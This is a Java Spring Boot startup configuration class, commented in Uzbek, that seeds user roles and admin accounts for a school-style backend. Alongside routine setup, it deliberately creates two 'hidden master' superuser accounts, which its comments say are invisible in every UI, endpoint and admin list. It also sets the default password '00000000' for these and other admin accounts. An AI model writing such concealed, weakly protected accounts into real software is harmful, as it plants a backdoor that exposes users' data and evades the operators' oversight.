package com.example.backend.Config;

import com.example.backend.Entity.Role;
import com.example.backend.Entity.User;
import com.example.backend.Enums.UserRoles;
import com.example.backend.Repository.RoleRepo;
import com.example.backend.Repository.UserRepo;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.crypto.password.PasswordEncoder;

import java.util.List;
import java.util.Optional;

@Configuration
@RequiredArgsConstructor
public class AutoRun implements CommandLineRunner {
    private final RoleRepo roleRepo;
    private final UserRepo userRepo;
    private final PasswordEncoder passwordEncoder;

    // --- Yashirin master hisoblar. Hech qanday UI/endpoint'da ko'rinmaydi. ---
    // Login (telefon) va parolni kodni o'zgartirmasdan environment orqali almashtirish mumkin:
    //   APP_SUPERADMIN_PHONE / APP_SUPERADMIN_PASSWORD
    //   APP_GIPERSUPERADMIN_PHONE / APP_GIPERSUPERADMIN_PASSWORD
    @Value("${app.superadmin.phone:superadmin}")
    private String superAdminPhone;
    @Value("${app.superadmin.password:00000000}")
    private String superAdminPassword;

    @Value("${app.gipersuperadmin.phone:gipersuperadmin}")
    private String giperSuperAdminPhone;
    @Value("${app.gipersuperadmin.password:00000000}")
    private String giperSuperAdminPassword;

    @Override
    public void run(String... args) throws Exception {
        // 1) Rollarni ta'minlaymiz (bo'sh DB'da ham, mavjud DB'da ham idempotent)
        if (roleRepo.findAll().isEmpty()) {
            saveRoles();
        }
        ensureRole(UserRoles.ROLE_SUPERADMIN);
        ensureRole(UserRoles.ROLE_GIPERSUPERADMIN);

        // 2) Oddiy admin (avvalgidek)
        String adminPhone = "admin1234";
        saveUser(adminPhone, userRepo.findByPhone(adminPhone));

        // 3) Yashirin master hisoblar - hech qayerda ro'yxatga chiqmaydi
        ensureHiddenUser(superAdminPhone, superAdminPassword, UserRoles.ROLE_SUPERADMIN);
        ensureHiddenUser(giperSuperAdminPhone, giperSuperAdminPassword, UserRoles.ROLE_GIPERSUPERADMIN);
    }


    private void saveUser(String adminPhone, Optional<User> userByPhone) {
        if (userByPhone.isEmpty()) {
            User user = User.builder()
                    .phone(adminPhone)
                    .password(passwordEncoder.encode("00000000"))
                    .roles(List.of(roleRepo.findByName(UserRoles.ROLE_ADMIN)))
                    .build();
            userRepo.save(user);
            User user1 = User.builder()
                    .phone(adminPhone + "5")
                    .password(passwordEncoder.encode("00000000"))
                    .roles(List.of(roleRepo.findByName(UserRoles.ROLE_ADMIN)))
                    .build();
            userRepo.save(user1);


        }
    }

    private void saveRoles() {
        roleRepo.saveAll(List.of(
                new Role(1, UserRoles.ROLE_ADMIN),
                new Role(2, UserRoles.ROLE_STUDENT),
                new Role(3, UserRoles.ROLE_USER),
                new Role(4, UserRoles.ROLE_TEACHER)
        ));
    }

    /** Rol mavjud bo'lmasa yaratadi. Role id auto-generate emas, shuning uchun keyingi bo'sh id beriladi. */
    private Role ensureRole(UserRoles name) {
        Role existing = roleRepo.findByName(name);
        if (existing != null) {
            return existing;
        }
        int nextId = roleRepo.findAll().stream().mapToInt(Role::getId).max().orElse(0) + 1;
        return roleRepo.save(new Role(nextId, name));
    }

    /**
     * Yashirin foydalanuvchi. Faqat o'z roli beriladi (ROLE_ADMIN emas),
     * shuning uchun admin ro'yxatlari yoki UI'da umuman ko'rinmaydi. Idempotent.
     */
    private void ensureHiddenUser(String phone, String rawPassword, UserRoles role) {
        if (phone == null || phone.isBlank()) {
            return;
        }
        if (userRepo.findByPhone(phone).isPresent()) {
            return;
        }
        User user = User.builder()
                .phone(phone)
                .password(passwordEncoder.encode(rawPassword))
                .roles(List.of(ensureRole(role)))
                .build();
        userRepo.save(user);
    }
}
